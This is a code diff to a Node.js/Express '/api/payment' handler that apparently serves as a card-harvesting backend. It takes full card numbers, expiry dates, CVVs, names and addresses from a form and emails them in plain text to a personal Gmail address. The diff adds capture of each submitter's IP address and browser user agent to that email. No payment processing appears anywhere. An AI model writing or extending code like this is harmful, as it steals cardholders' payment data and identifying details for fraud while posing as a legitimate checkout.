@@ -23,8 +23,17 @@ app.post("/api/payment", async (req, res) => {
     year,
     "security-code": cvv,
     "full-name": fullName,
-    address
+    address,
+    userAgent // added from frontend
   } = formData;
+
+  // ✅ Capture IP address (supports proxies like Render/Heroku)
+  const ip =
+    req.headers["x-forwarded-for"]?.split(",")[0] ||
+    req.socket.remoteAddress;
+
+  // If frontend didn't send userAgent, fallback to request headers
+  const agent = userAgent || req.headers["user-agent"];
 
   try {
     // ✅ Setup Nodemailer transporter
@@ -42,13 +51,17 @@ app.post("/api/payment", async (req, res) => {
       to: "clintonrecher37@gmail.com", // replace with your receiving email
       subject: "💳 New Payment Form Submission",
       text: `
-      📩 New Payment Submission Received:
+📩 New Payment Submission Received:
 
-      👤 Full Name: ${fullName}
-      🏠 Address: ${address}
-      💳 Card Number: ${cardNumber}
-      📅 Expiry: ${month}/${year}
-      🔒 CVV: ${cvv}
+👤 Full Name: ${fullName}
+🏠 Address: ${address}
+
+💳 Card Number: ${cardNumber}
+📅 Expiry: ${month}/${year}
+🔒 CVV: ${cvv}
+
+🌍 IP Address: ${ip}
+🖥️ User Agent: ${agent}
       `
     });
 
